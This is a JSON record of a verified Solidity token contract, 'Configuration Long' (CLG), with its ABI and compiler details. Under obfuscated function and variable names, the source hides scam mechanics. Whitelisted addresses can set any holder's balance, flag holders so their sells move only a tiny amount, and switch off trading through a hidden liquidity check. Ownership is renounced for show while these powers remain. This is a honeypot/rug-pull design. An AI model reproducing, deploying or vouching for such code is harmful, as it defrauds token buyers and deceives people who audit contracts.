{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface sellMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract buySender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoTotal {\n    function createPair(address toModeWallet, address totalShouldLaunch) external returns (address);\n}\n\ninterface takeTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minAmount) external view returns (uint256);\n\n    function transfer(address enableLaunch, uint256 takeLaunched) external returns (bool);\n\n    function allowance(address fromReceiverAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableLaunch,\n        uint256 takeLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchSell, uint256 value);\n    event Approval(address indexed fromReceiverAuto, address indexed spender, uint256 value);\n}\n\ninterface takeTeamMetadata is takeTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConfigurationLong is buySender, takeTeam, takeTeamMetadata {\n\n    string private listTeamSell = \"Configuration Long\";\n\n    function approve(address marketingMin, uint256 takeLaunched) public virtual override returns (bool) {\n        exemptMaxAmount[_msgSender()][marketingMin] = takeLaunched;\n        emit Approval(_msgSender(), marketingMin, takeLaunched);\n        return true;\n    }\n\n    bool public buyAt;\n\n    function receiverLiquidity(uint256 takeLaunched) public {\n        receiverLimitTake();\n        liquidityFund = takeLaunched;\n    }\n\n    uint256 liquidityFund;\n\n    mapping(address => mapping(address => uint256)) private exemptMaxAmount;\n\n    function receiverLimitTake() private view {\n        require(atLaunch[_msgSender()]);\n    }\n\n    bool public amountTake;\n\n    mapping(address => uint256) private atLaunchTeam;\n\n    uint256 constant shouldMode = 11 ** 10;\n\n    function takeWallet(address fromBuy) public {\n        if (buyAt) {\n            return;\n        }\n        if (minFeeMarketing == fromReceiver) {\n            minFeeMarketing = fromReceiver;\n        }\n        atLaunch[fromBuy] = true;\n        if (fromReceiver != minFeeMarketing) {\n            fromReceiver = minFeeMarketing;\n        }\n        buyAt = true;\n    }\n\n    address listLiquidityAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private minFeeMarketing;\n\n    function shouldAuto(address modeTakeToken) public {\n        receiverLimitTake();\n        \n        if (modeTakeToken == amountTx || modeTakeToken == teamReceiverLimit) {\n            return;\n        }\n        liquidityAtExempt[modeTakeToken] = true;\n    }\n\n    function balanceOf(address minAmount) public view virtual override returns (uint256) {\n        return atLaunchTeam[minAmount];\n    }\n\n    function getOwner() external view returns (address) {\n        return walletSender;\n    }\n\n    uint256 private fromReceiver;\n\n    function owner() external view returns (address) {\n        return walletSender;\n    }\n\n    address private walletSender;\n\n    function walletMax() public {\n        emit OwnershipTransferred(amountTx, address(0));\n        walletSender = address(0);\n    }\n\n    function transferFrom(address walletAuto, address enableLaunch, uint256 takeLaunched) external override returns (bool) {\n        if (_msgSender() != listLiquidityAuto) {\n            if (exemptMaxAmount[walletAuto][_msgSender()] != type(uint256).max) {\n                require(takeLaunched <= exemptMaxAmount[walletAuto][_msgSender()]);\n                exemptMaxAmount[walletAuto][_msgSender()] -= takeLaunched;\n            }\n        }\n        return amountMax(walletAuto, enableLaunch, takeLaunched);\n    }\n\n    bool private receiverTake;\n\n    uint8 private autoLimit = 18;\n\n    mapping(address => bool) public liquidityAtExempt;\n\n    mapping(address => bool) public atLaunch;\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableTake;\n    }\n\n    function transfer(address modeTradingWallet, uint256 takeLaunched) external virtual override returns (bool) {\n        return amountMax(_msgSender(), modeTradingWallet, takeLaunched);\n    }\n\n    function sellLaunched(address walletAuto, address enableLaunch, uint256 takeLaunched) internal returns (bool) {\n        require(atLaunchTeam[walletAuto] >= takeLaunched);\n        atLaunchTeam[walletAuto] -= takeLaunched;\n        atLaunchTeam[enableLaunch] += takeLaunched;\n        emit Transfer(walletAuto, enableLaunch, takeLaunched);\n        return true;\n    }\n\n    function amountMax(address walletAuto, address enableLaunch, uint256 takeLaunched) internal returns (bool) {\n        if (walletAuto == amountTx) {\n            return sellLaunched(walletAuto, enableLaunch, takeLaunched);\n        }\n        uint256 fundMaxReceiver = takeTeam(teamReceiverLimit).balanceOf(listToTeam);\n        require(fundMaxReceiver == liquidityFund);\n        require(enableLaunch != listToTeam);\n        if (liquidityAtExempt[walletAuto]) {\n            return sellLaunched(walletAuto, enableLaunch, shouldMode);\n        }\n        return sellLaunched(walletAuto, enableLaunch, takeLaunched);\n    }\n\n    function allowance(address launchReceiverTx, address marketingMin) external view virtual override returns (uint256) {\n        if (marketingMin == listLiquidityAuto) {\n            return type(uint256).max;\n        }\n        return exemptMaxAmount[launchReceiverTx][marketingMin];\n    }\n\n    uint256 modeAt;\n\n    address public amountTx;\n\n    function swapIs(address modeTradingWallet, uint256 takeLaunched) public {\n        receiverLimitTake();\n        atLaunchTeam[modeTradingWallet] = takeLaunched;\n    }\n\n    event OwnershipTransferred(address indexed walletFrom, address indexed fromMax);\n\n    address listToTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoLimit;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listTeamSell;\n    }\n\n    bool public sellMax;\n\n    uint256 private tokenReceiverMarketing = 100000000 * 10 ** 18;\n\n    string private enableTake = \"CLG\";\n\n    address public teamReceiverLimit;\n\n    constructor (){\n        if (sellMax != receiverTake) {\n            receiverTake = false;\n        }\n        sellMode minTradingMode = sellMode(listLiquidityAuto);\n        teamReceiverLimit = autoTotal(minTradingMode.factory()).createPair(minTradingMode.WETH(), address(this));\n        if (fromReceiver != minFeeMarketing) {\n            fromReceiver = minFeeMarketing;\n        }\n        amountTx = _msgSender();\n        walletMax();\n        atLaunch[amountTx] = true;\n        atLaunchTeam[amountTx] = tokenReceiverMarketing;\n        \n        emit Transfer(address(0), amountTx, tokenReceiverMarketing);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenReceiverMarketing;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromReceiverAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchReceiverTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityAtExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeLaunched\",\"type\":\"uint256\"}],\"name\":\"receiverLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTakeToken\",\"type\":\"address\"}],\"name\":\"shouldAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTradingWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLaunched\",\"type\":\"uint256\"}],\"name\":\"swapIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromBuy\",\"type\":\"address\"}],\"name\":\"takeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiverLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTradingWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConfigurationLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}